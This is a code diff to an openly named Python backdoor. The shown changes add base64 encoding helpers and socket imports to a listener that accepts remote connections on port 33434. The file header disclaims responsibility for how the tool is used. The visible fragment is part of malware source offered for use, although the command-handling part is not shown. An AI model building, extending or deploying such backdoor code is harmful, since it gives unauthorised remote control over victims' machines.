@@ -7,11 +7,23 @@
 # I am not responsible for anything you do with it.
 # ----------------------------------------------------
 
+# Imports
+import base64
+import socket
+
 
 # Variables
 __version__ = '0.0.1'
 CHUNKS = 2048
 PORT = 33434
+
+
+def _base64_encode(message):
+    return base64.b64encode(message)
+
+
+def _base64_decode(message):
+    return base64.b64decode(message)
 
 
 def simple_python_backdoor_create_socket():
@@ -42,7 +54,7 @@ def main():
     try:
         connection, address = _socket.accept()
         # No timeout
-        connection.setblocking(1)
+        connection.setblocking(True)
         print(f'Connection has been established [IP: {address[0]} / PORT: {address[1]}]!!!')
     except socket.error() as str_error:
         print(f'\nError accepting connections!!!\n{str_error}')
